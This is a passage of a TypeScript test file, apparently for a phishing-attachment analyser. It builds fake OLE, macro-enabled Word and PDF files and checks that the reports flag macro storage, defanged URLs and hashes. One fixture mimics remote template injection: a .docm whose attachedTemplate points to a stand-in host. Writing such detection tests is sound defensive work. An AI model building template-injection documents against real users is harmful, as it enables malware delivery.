    const [head, tail, between] = [...said.matchAll(/[\d,]+/g)].map((m) => Number(m[0].replace(/,/g, '')))
    expect(said).toMatch(/bytes between were not scanned for indicators or script names$/)
    expect(head).toBeLessThanOrEqual(1_000_000)
    expect(tail).toBeLessThanOrEqual(1_000_000)
    expect(head + tail + between).toBe(size)
  })
})

describe('a legacy Office document', () => {
  /** A version 3 compound file: header, one FAT sector, one directory sector. */
  function compound(entries: [name: string, type: number][]): Uint8Array {
    const bytes = new Uint8Array(512 * 3)
    const view = new DataView(bytes.buffer)
    bytes.set([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1])
    view.setUint16(0x1e, 9, true)
    view.setUint32(0x2c, 1, true)
    view.setUint32(0x30, 1, true)
    for (let i = 0; i < 109; i++) view.setUint32(0x4c + i * 4, i === 0 ? 0 : 0xffffffff, true)
    for (let i = 0; i < 128; i++) view.setUint32(512 + i * 4, 0xffffffff, true)
    view.setUint32(512, 0xfffffffd, true) // sector 0 is the FAT
    view.setUint32(516, 0xfffffffe, true) // sector 1 is the whole directory
    entries.forEach(([name, type], slot) => {
      const at = 1024 + slot * 128
      for (let i = 0; i < name.length; i++) view.setUint16(at + i * 2, name.charCodeAt(i), true)
      view.setUint16(at + 0x40, (name.length + 1) * 2, true)
      bytes[at + 0x42] = type
    })
    return bytes
  }

  it('lists what its directory names, and says which names are macro storage', async () => {
    const doc = compound([
      ['Root Entry', 5],
      ['Macros', 1],
      ['WordDocument', 2]
    ])
    const report = await analysePhishing(mailWith(attached('Invoice.doc', doc, 'application/msword')), [], [])
    const [a] = report.attachments
    expect(a.ole?.entries.map((e) => e.name)).toEqual(['Root Entry', 'Macros', 'WordDocument'])
    const md = formatPhishReport(report)
    expect(md).toContain('  - 3 entries read from the compound-file directory')
    expect(md).toContain('  - the compound-file directory lists storage `Macros`: named as VBA macro storage')
    expect(md).not.toContain('embedded picture')
  })
})

describe('end to end, on files shaped like the real thing', () => {
  it('reads a macro document: its project, its remote template and its picture', async () => {
    const vba = new Uint8Array(512)
    vba.set([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1])
    const settings = rels(['attachedTemplate', 'https://cdn-invoices.test/tpl/remote.dotm'])
    const packed = await deflateRaw(settings)
    const docm = zip([
      { name: '[Content_Types].xml', data: ascii('<Types/>') },
      { name: 'word/document.xml', data: ascii('<w:document/>') },
      { name: 'word/_rels/settings.xml.rels', data: packed, method: 8, size: settings.length },
      { name: 'word/vbaProject.bin', data: vba },
      { name: 'word/media/image1.png', data: PNG }
    ])
    const mail = mailWith(attached('Invoice_0931.docm', docm, 'application/vnd.ms-word.document.macroEnabled.12'))
    const report = await analysePhishing(mail, [], [])
    const [a] = report.attachments
    const vbaHash = await hashBytes(vba)
    const md = formatPhishReport(report)
    expect(a.facts).toContain('file type that can carry macros')
    expect(md).toContain('  - 5 entries read from the ZIP directory')
    expect(md).toContain('  - entry `word/vbaProject.bin`: named as a VBA macro project')
    expect(md).toContain(
      '  - external target: `hxxps://cdn-invoices[.]test/tpl/remote[.]dotm` — relationship type `attachedTemplate`, declared in `word/_rels/settings.xml.rels`'
    )
    expect(md).toContain(
      `  - inner file \`word/vbaProject.bin\`: bytes begin as legacy Office document (OLE); SHA-256 ${vbaHash} (computed here)`
    )
    expect(md).toMatch(
      /embedded picture `word\/media\/image1\.png`: PNG image, 16 bytes, SHA-256 [0-9a-f]{64} \(computed here\)/
    )
    expect(report.indicators).toContain('url: hxxps://cdn-invoices[.]test/tpl/remote[.]dotm')
    expect(report.indicators).toContain(`hash: ${vbaHash}`)
    // Shown once, where it was found — not again under "found inside the file".
    expect(a.inside.some((l) => l.includes('remote[.]dotm'))).toBe(false)
    const iocs = caseIocs(report, mail)
    expect(iocs).toContainEqual({
      type: 'url',
      value: 'https://cdn-invoices.test/tpl/remote.dotm',
      note: 'inside Invoice_0931.docm'
    })
    expect(iocs).toContainEqual({
      type: 'hash',
      value: vbaHash,
      note: 'word/vbaProject.bin inside Invoice_0931.docm (hashed here)'
    })
  })

  it('states a reader that broke as a fact about the file, and keeps the hashes', async () => {
    pdfReader.throws = true
    try {
      const bytes = ascii(pdf('<< /Type /Catalog >>'))
      const report = await analysePhishing(mailWith(attached('scan.pdf', bytes, 'application/pdf')), [], [])
      const [a] = report.attachments
      expect(a.facts).toContain('the PDF structure reader stopped on this file, so its contents are not listed')
      expect('pdf' in a).toBe(false)
      expect(a.sha256).toBe(await hashBytes(bytes))
    } finally {
      pdfReader.throws = false
    }
  })

  it('lists fifty PDF links, counts the rest, and puts every one in the indicators', async () => {
    const links = Array.from({ length: 60 }, (_, i) => `<< /A << /S /URI /URI (https://l${i}.test/x) >> >>`)
    const report = await analysePhishing(
      mailWith(attached('links.pdf', ascii(pdf('<< /Type /Catalog >>', ...links)), 'application/pdf')),
      [],
      []
    )
    const lines = structureLines(report.attachments[0])
    expect(lines.filter((l) => l.startsWith('  - PDF link (/URI): '))).toHaveLength(50)
    expect(lines).toContain('  - 10 further PDF links are not listed')
    for (let i = 0; i < 60; i++) expect(report.indicators).toContain(`url: hxxps://l${i}[.]test/x`)
  })
})
